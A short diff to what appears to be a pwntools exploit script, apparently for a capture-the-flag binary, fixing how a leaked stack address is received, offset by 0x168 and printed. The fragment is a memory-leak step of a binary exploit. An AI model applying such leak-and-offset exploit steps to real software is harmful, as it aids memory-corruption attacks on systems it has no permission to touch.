@@ -86,7 +86,7 @@ add()
 add()         
 
 show(15)
-stack_addr = u64(io.recvuntil(6).ljust(8, b'\x00'))
+stack_addr = u64(io.recv(6).ljust(8, b'\x00'))
 stack_addr = stack_addr - 0x168
 
 print("stack_addr: "+ hex(stack_addr))
